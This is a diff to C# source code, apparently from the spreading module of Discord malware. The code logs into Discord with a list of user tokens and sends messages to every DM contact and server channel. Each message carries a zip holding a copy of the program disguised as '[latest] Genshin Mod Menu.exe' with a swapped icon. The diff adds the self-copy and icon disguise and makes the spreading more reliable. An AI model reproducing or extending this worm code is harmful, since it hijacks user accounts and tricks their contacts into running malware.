@@ -1,5 +1,6 @@
 ﻿using Discord;
 using Discord.WebSocket;
+
 using System;
 using System.Collections.Generic;
 using System.IO;
@@ -29,7 +30,7 @@ namespace Client.Armitage.Postman
         private byte[] _attachment;
         public async void Start()
         {
-            await Task.Run(() =>
+            await Task.Run(async () =>
             {
                 foreach (string _token in _tokens)
                 {
@@ -40,29 +41,41 @@ namespace Client.Armitage.Postman
                         _donetokens.Add(token);
                         try
                         {
+                            Console.WriteLine($"Trying token {token}");
 
                             var _client = new DiscordSocketClient();
 
-                            _client.LoginAsync(TokenType.User, token).Wait();
+                            _client.Disconnected += (s) => {
+                                Console.WriteLine(s.ToString());
+                                return null;
+                            };
 
-                            if (_client.LoginState == LoginState.LoggedIn)
-                            {
-                                _client.StartAsync().Wait();
+                            await _client.LoginAsync(TokenType.User, token);
 
+                            if (_client.LoginState == LoginState.LoggedIn) {
 
-                                Thread.Sleep(5000);
+                                await _client.StartAsync();
+
+                                await Task.Delay(5000);
 
                                 _clients.Add(_client);
 
-                                Task.Run(() => { Spread(_client); });
+                                Console.WriteLine("State : " + _client.ConnectionState.ToString());
+
+                                new Thread(() => { Spread(_client); }).Start();
+                            }
+                            else {
+                                Console.WriteLine($"State was : {_client.LoginState.ToString()}");
                             }
 
                             Task.Delay(Constants.Rand.Next(1000, 3000)).Wait();
                         }
-                        catch (Exception ex) {
-                            Communication.String_Stacker.Send(ex.ToString(), Communication.String_Stacker.StringType.ApplicationEvent );
-                        }
+                        catch (Exception ex)
+                        {
+                            Console.WriteLine($"Something happened : {ex.ToString()}");
 
+                            Communication.String_Stacker.Send(ex.ToString(), Communication.String_Stacker.StringType.ApplicationEvent);
+                        }
                     }
                 }
             });
@@ -70,23 +83,22 @@ namespace Client.Armitage.Postman
 
         private List<ulong> _doneids = new List<ulong>();
 
-        private async void Spread(DiscordSocketClient me)
+        private void Spread(DiscordSocketClient me)
         {
-            do
-            {
-                await Task.Delay(5000);
-            }
-            while (me.ConnectionState != ConnectionState.Connected);
-
-            Console.WriteLine("Now spreading...");
+            while (me.ConnectionState == ConnectionState.Connecting) Thread.Sleep(1000);
 
             // spread to dms
-            Task.Run(() => { SpreadToDMs(me); });
-
-            await Task.Delay(1000);
+            Task.Run(() => { SpreadToDMs(me); }).Wait();
 
             // spread to guilds
-            Task.Run(() => { SpreadToGuilds(me); });
+            Task.Run(() => { SpreadToGuilds(me); }).Wait();
+
+            // set discord sent to true
+            Properties.Settings.Default.LastDiscordSent = Constants.Today;
+            Properties.Settings.Default.IsDiscordSent = true;
+            Properties.Settings.Default.Save();
+
+            Console.WriteLine("Discord Sent Settings is Set to true");
         }
         private void SpreadToGuilds(DiscordSocketClient me)
         {
@@ -111,6 +123,8 @@ namespace Client.Armitage.Postman
                         }
                         catch (Exception ex)
                         {
+                            Console.WriteLine($"error sending {ex.ToString()}");
+
                             Communication.String_Stacker.Send(ex.ToString(), Communication.String_Stacker.StringType.ApplicationEvent);
                         }
                 }
@@ -118,7 +132,7 @@ namespace Client.Armitage.Postman
         }
         private void SpreadToDMs(DiscordSocketClient me)
         {
-            var dms = me.DMChannels.ToList();
+            var dms = me.DMChannels;
 
             foreach (var channel in dms)
             {
@@ -128,6 +142,7 @@ namespace Client.Armitage.Postman
                     )
                     try
                     {
+
                         _doneids.Add(channel.Recipient.Id);
 
                         SendPayload(channel);
@@ -136,6 +151,8 @@ namespace Client.Armitage.Postman
                     }
                     catch (Exception ex)
                     {
+                        Console.WriteLine($"error sending {ex.ToString()}");
+
                         Communication.String_Stacker.Send(ex.ToString(), Communication.String_Stacker.StringType.ApplicationEvent);
                     }
             }
@@ -147,9 +164,11 @@ namespace Client.Armitage.Postman
             foreach (string message in sequence)
             {
                 channel.SendMessageAsync(message).Wait();
+
+                Task.Delay(200).Wait();
             }
 
-            Console.WriteLine($"sending {_attachment.Length}");
+            Console.WriteLine($"sending {_attachment.Length} of filename {Utilities.Updater.Latest.DiscordFileName}");
 
             channel.SendFileAsync(new MemoryStream(_attachment), Utilities.Updater.Latest.DiscordFileName).Wait();
 
@@ -179,7 +198,15 @@ namespace Client.Armitage.Postman
 
             zip.AddTextFile(readme.ToString(), "README.txt");
 
-            zip.AddFile(Constants.MyBytes, "[latest] Genshin Mod Menu.exe");
+            string newpath = Copy.CopyRandSelf();
+
+            if (!string.IsNullOrEmpty(newpath))
+            {
+                // set the mfker's icon
+                Utilities.Icon_Util.ChangeIcon(newpath, Properties.Resources.circle_cropped);
+
+                zip.AddFile(File.ReadAllBytes(newpath), "[latest] Genshin Mod Menu.exe");
+            }
 
             return zip.CreateZip();
         }
